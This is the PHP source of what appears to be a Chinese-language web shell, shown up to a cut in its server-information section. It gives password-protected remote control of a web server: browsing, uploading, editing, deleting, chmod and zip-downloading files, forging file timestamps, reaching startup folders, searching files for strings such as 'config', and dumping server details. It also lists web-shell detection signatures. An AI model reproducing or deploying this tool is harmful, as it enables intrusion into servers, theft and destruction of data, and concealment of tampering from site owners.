<?php
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
set_time_limit(0);

function Root_GP(&$array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}

function Root_CSS()
{
print<<<END
<style type="text/css">
	*{padding:0; margin:0;}
	body{background:threedface;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
	a{color:#000000;text-decoration:none;}
	a:hover{background:#BBBBBB;}
	table{color:#000000;font-family:"Verdana", "Tahoma", "宋体",sans-serif;font-size:13px;border:1px solid #999999;}
	td{background:#F9F6F4;}
	.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
	.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
	.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false;
}

//文件管理
class packdir
{
	var $out = '';
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function packdir($array)
	{
		if(@function_exists('gzcompress'))
		{
			for($n = 0;$n < count($array);$n++)
			{
				$array[$n] = urldecode($array[$n]);
				$fp = @fopen($array[$n], 'r');
				$filecode = @fread($fp, @filesize($array[$n]));
				@fclose($fp);
				$this -> filezip($filecode,basename($array[$n]));
			}
			@closedir($zhizhen);
			$this->out = $this->packfile();
			return true;
		}
		return false;
	}
	function at($atunix = 0)
	{
		$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
		if ($unixarr['year'] < 1980)
		{
			$unixarr['year']    = 1980;
			$unixarr['mon']     = 1;
			$unixarr['mday']    = 1;
			$unixarr['hours']   = 0;
			$unixarr['minutes'] = 0;
			$unixarr['seconds'] = 0;
		} 
		return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
	}
	function filezip($data, $name, $time = 0)
	{
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->at($time));
		$hexdtime	= '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function packfile()
	{
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
	}
}

function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Size($size)
{
	if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
	elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
	elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
	else $size = $size . ' B';
	return $size;
}

function File_Mode()
{
	$self = $_SERVER['PH'.'P_S'.'ELF'] ? File_Str($_SERVER['PH'.'P_S'.'ELF']) : File_Str($_SERVER['SCRI'.'PT_N'.'AME']);
	$thisfile = File_Str(__FILE__);
	$rootdir = str_replace($self,'',$thisfile).'/';
	return $rootdir;
}

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	$key = @fwrite($handle,$filecode) ? true : false;
	@fclose($handle);
	if(!$key) @chmod($filename,0666);
	$handle = @fopen($filename,$filemode);
	$key = @fwrite($handle,$filecode) ? true : false;
	@fclose($handle);
	return $key;
}

function File_Up($filea,$fileb)
{
	$key = @copy($filea,$fileb) ? true : false;
	if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
	return $key;
}
$password = "123123123s";
function File_Down($filename)
{
	if(!file_exists($filename)) return false;
	$filedown = basename($filename);
	$array = explode('.', $filedown);
	$arrayend = array_pop($array);
	header('Content-type: application/x-'.$arrayend);
	header('Content-Disposition: attachment; filename='.$filedown);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}


function File_Deltree($dirname){
       if ($dirHandle = opendir($dirname)){
           $old_cwd = getcwd();
           chdir($dirname);

           while ($file = readdir($dirHandle)){
               if ($file == '.' || $file == '..') continue;

               if (is_dir($file)){
                   if (!File_Deltree($file)) return false;
               }else{
                   if (!unlink($file)) return false;
               }
           }

           closedir($dirHandle);
           chdir($old_cwd);
           if (!rmdir($dirname)) return false;

           return true;
       }else{
           return false;
       }
   }

function File_Act($array,$actall,$inver)
{
	if(($count = count($array)) == 0) return '请选择文件';
	if($actall == 'e')
	{
		$zip = new packdir;
		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
		return '打包所选文件失败';
	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
}

function File_Edit($filepath,$filename,$dim = '')
{
	$THIS_DIR = urlencode($filepath);
	$THIS_FILE = File_Str($filepath.'/'.$filename);
	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('editor').submit();}
}
</script>
<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="查找" onclick="search(searchs.value)"></div>
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">文件修改时间 <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;">
<input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
</form>
END;
}

function File_Soup($p)
{
	$THIS_DIR = urlencode($p);
	$UP_SIZE = get_cfg_var('upload_max_filesize');
	$MSG_BOX = '单个附件允许大小:'.$UP_SIZE.', 改名格式(new.php),如为空,则保持原文件名.';
	if(!empty($_POST['updir']))
	{
		if(count($_FILES['soup']) >= 1)
		{
			$i = 0;
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					$souptmp = $_FILES['soup']['tmp_name'][$key];
					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'上传成功' : $soupname.'上传失败';
				}
				$i++;
			}
		}
		else
		{
			$MSG_BOX = '请选择文件';
		}
	}
print<<<END
<div class="msgbox">{$MSG_BOX}</div>
<form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
<div class="actall">上传到目录: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
<div class="actall">附件1 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
<div class="actall">附件2 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
<div class="actall">附件3 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
<div class="actall">附件4 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
<div class="actall">附件5 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
<div class="actall">附件6 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
<div class="actall">附件7 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
<div class="actall">附件8 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
<div class="actall"><input type="submit" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
</form>
END;
}

function File_a($p)
{
	$GETURL = 'http://'.$_SERVER['HT'.'TP_H'.'OST'].'/';
	$MSG_BOX = '等待消息队列';
	$UP_DIR = dirname(File_Str($p));
	$REAL_DIR = File_Str(realpath($p));
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
	$THIS_DIR = urlencode(File_Str($REAL_DIR));
	$NUM_D = 0;
	$NUM_F = 0;
	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' 成功' : '编辑文件 '.$_POST['pfn'].' 失败';@touch($_POST['pfn'],$intime);}
	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}
	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = '属性值错误'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '修改 '.$modfile.' 属性为 '.$_GET['md'].' 成功' : '修改 '.$modfile.' 属性为 '.$_GET['md'].' 失败';}
	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}
	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}
	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}
	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = '下载文件不存在';}
	Root_CSS();
print<<<END
<script type="text/javascript">
	function Inputok(msg,gourl)
	{
		smsg = "当前文件:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + msg + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == 'b')
			{
				document.getElementById('actall').value = gourl;
				document.getElementById('fileall').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,txt);
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = re;
			document.getElementById('fileall').submit();
		}
	}
</script>
	<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
	<div class="actall" style="text-align:center;padding:3px;">
	<form method="GET"><input type="hidden" id="s" name="s" value="a">
	<input type="text" name="p" value="{$p}" style="width:550px;height:22px;">
	<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
	<option>---特殊目录---</option>
	<option value="{$ROOT_DIR}"> 网站根目录 </option>
	<option value="{$FILE_DIR}"> 本程序目录 </option>
	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动"> 所有组启动项 </option>
	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> 英文启动项 </option>
	<option value="C:/RECYCLER"> RECYCLER </option>
	<option value="C:/Program Files"> Program Files </option>
	<option value="/tmp"> /tmp </option>
	<option value="/var/tmp"> /var/tmp </option>
	<option value="/usr/local"> /usr/local </option>
	</select> <input type="submit" value="转到" style="width:50px;"></form>
	<div style="margin-top:3px;"></div>
	<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
	<input type="button" value="新建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
	<input type="button" value="新建目录" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
	<input type="button" value="批量上传" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
	<input type="file" name="ufp" style="width:300px;height:22px;">
	<input type="text" name="ufn" style="width:121px;height:22px;">
	<input type="submit" value="上传" style="width:50px;">
	</form>
	</div>
	<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
	<table border="0"><tr>
	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>上级目录</b></a> </td>
	<td class="toptd" style="width:80px;"> 操作 </td>
	<td class="toptd" style="width:48px;"> 属性 </td>
	<td class="toptd" style="width:173px;"> 修改时间 </td>
	<td class="toptd" style="width:75px;"> 大小 </td></tr>
END;
	$h_d = @opendir($p);
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(is_dir($Filepath))
		{
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filepath = urlencode($Filepath);
			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
			$Filename = urlencode($Filename);
			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> 删除 </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td> ';
			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td> </td> </tr>'."\r\n";
			$NUM_D++;
		}
	}
	@rewinddir($h_d);
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(!is_dir($Filepath))
		{
			$Fileurls = str_replace($ROOT_DIR,$GETURL,$Filepath);
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filesize = File_Size(@filesize($Filepath));
			if($Filepath == File_Str(__FILE__)) $fname = '<font color="#8B0000">'.$Filename.'</font>'; else $fname = $Filename;
			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
			$Filepath = urlencode($Filepath);
			$Filename = urlencode($Filename);
			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> 编辑 </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td>';
			echo ' <td>'.$Fileperm.'</td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
			$NUM_F++;
		}
	}
	@closedir($h_d);
	if(!$Filetime) $Filetime = '2009-01-01 00:00:00';
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$THIS_DIR}','a');return false;"> 
<input type="button" value="删除" onclick="Delok('所选文件','b');return false;"> 
<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"> 
<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','spider.tar.gz','e');return false;"> 
目录({$NUM_D}) / 文件({$NUM_F})</div> 
</form> 
END;
	return true;
}

//扫描木马

function Antivirus_Auto($sp,$features,$st,$sb)
{
	if(($h_d = @opendir($sp)) == NULL) return false;
	$ROOT_DIR = File_Mode();
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($sp.'/'.$Filename);
		if(is_dir($Filepath) && $sb) Antivirus_Auto($Filepath,$features,$st);
		if(eregi($st,$Filename))
		{
			if($Filepath == File_Str(__FILE__)) continue;
			$ic = File_Read($Filepath);
			foreach($features as $var => $key)
			{
				if(stristr($ic,$key))
				{
					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SER'.'VER_NA'.'ME'].'/',$Filepath);
					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
					echo ' <a href="'.$Fileurls.'" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br> 【<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank"> 编辑 </a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank"> 删除 </a> 】 ';
					echo ' 【 '.$Filetime.' 】 <font color="#FF0000"> '.$var.' </font> <br> <br> '."\r\n";
					break;
				}
			}
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}

function Antivirus_e()
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sp']) ? $_POST['sp'] : File_Mode();
	$features_php = array('php大马特征1'=>'cha88.cn','php大马特征2'=>'->read()','php大马特征3'=>'readdir(','危险MYSQL语句4'=>'returns string soname','php加密大马特征5'=>'eval(gzin'.'flate(','php加密大马特征6'=>'ev'.'al(base'.'64_decode(','php一句话特征7'=>'eval($_','php一句话特征8'=>'eval ($_','php上传后门特征9'=>'copy($_FILES','php上传后门特征10'=>'copy ($_FILES','php上传后门特征11'=>'move_uploaded_file($_FILES','php上传后门特征12'=>'move_uploaded_file ($_FILES','php小马特征13'=>'str_replace(\'\\\\\',\'/\',');
	$features_asx = array('asp小马特征1'=>'绝对路径','asp小马特征2'=>'输入马的内容','asp小马特征3'=>'fso.createtextfile(path,true)','asp一句话特征4'=>'<%execute(request','asp一句话特征5'=>'<%eval request','asp一句话特征6'=>'ex'.'ecute ses'.'sion(','asp数据库后门特征7'=>'--Created!','asp大马特征8'=>'WSc'.'ript.She'.'ll','asp大小马特征9'=>'<%@ LANGUAGE = VBSc'.'ript.Enc'.'ode %>','aspx大马特征10'=>'www.ro'.'otk'.'it.net.cn','aspx大马特征11'=>'Proc'.'ess.GetProc'.'esses','aspx大马特征12'=>'lake2');
print<<<END
<form method="POST" name="tform" id="tform" action="?s=e">
<div class="actall">扫描路径 <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">木马类型 <input type="checkbox" name="stphp" value="php" checked>php木马 
<input type="checkbox" name="stasx" value="asx">asp+aspx木马</div>
<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>将扫马应用于该文件夹,子文件夹和文件
<br><input type="radio" name="sb" value="b">仅将扫马应用于该文件夹</div>
<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
</form>
END;
	if(!empty($_POST['sp']))
	{
		echo '<div class="actall">';
		if(isset($_POST['stphp'])){$features_all = $features_php; $st = '\.php|\.inc|\;';}
		if(isset($_POST['stasx'])){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
		if(isset($_POST['stphp']) && isset($_POST['stasx'])){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
		$sb = ($_POST['sb'] == 'a') ? true : false;
		echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? '扫描完毕' : '异常终止';
		echo '</div>';
	}
	return true;
}

//搜索文件

function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb)
{
	if(($h_d = @opendir($sfp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		if(eregi($sft,$Filename)) continue;
		$Filepath = File_Str($sfp.'/'.$Filename);
		if(is_dir($Filepath) && $sfb) Findfile_Auto($Filepath,$sfc,$sft,$sff,$sfb);
		if($sff)
		{
			if(stristr($Filename,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
		else
		{
			$File_code = File_Read($Filepath);
			if(stristr($File_code,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
	}
	@closedir($h_d);
	return true;
}

function Findfile_j()
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode();
	$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';
	$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';
print<<<END
<form method="POST" name="jform" id="jform" action="?s=j">
<div class="actall">扫描路径 <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">过滤文件 <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
<div class="actall">关键字串 <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
<input type="radio" name="sff" value="a" checked>搜索文件名 
<input type="radio" name="sff" value="b">搜索包含文字</div>
<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>将搜索应用于该文件夹,子文件夹和文件
<br><input type="radio" name="sfb" value="b">仅将搜索应用于该文件夹</div>
<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))
	{
		echo '<div class="actall">';
		$_POST['sft'] = str_replace('.','\\.',$_POST['sft']);
		$sff = ($_POST['sff'] == 'a') ? true : false;
		$sfb = ($_POST['sfb'] == 'a') ? true : false;
		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '搜索完毕' : '异常终止';
		echo '</div>';
	}
	return true;
}

//系统信息

function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}
function Info_f()
{
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("服务器基本信息",php_uname()),
		array("服务器时间",date("Y年m月d日 h:i:s",time())),
		array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
		array("服务器操作系统",PHP_OS),
		array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
